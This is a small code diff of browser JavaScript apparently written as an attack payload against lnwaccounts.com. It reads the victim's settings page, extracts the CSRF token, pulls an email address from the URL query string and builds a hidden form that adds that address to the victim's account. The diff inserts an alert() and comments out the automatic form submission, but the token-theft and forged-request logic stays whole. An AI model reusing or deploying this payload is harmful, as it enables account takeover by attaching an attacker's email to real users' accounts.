@@ -9,6 +9,7 @@ xmlhttp.onreadystatechange=function()
 		var csrf_token = settingHTML.match(patt1);
 		var email = window.location.href;
 		email=email.split('?')
+		alert(email[email.length-1]);
 		var url = 'https://lnwaccounts.com/manage/setting/email/add';
 		var form = $('<form action="' + url + '" method="post">' +
 		'<input type="hidden" name="email" value="'+email[email.length-1]+'" />' +
@@ -17,7 +18,7 @@ xmlhttp.onreadystatechange=function()
 		'<input type="hidden" name="csrf_token" value="'+csrf_token+'" />' +
 		'</form>');
 		$('body').append(form);
-		$(form).submit();
+		//$(form).submit();
 	}
 }
 xmlhttp.open("GET","https://lnwaccounts.com/manage/setting",true);
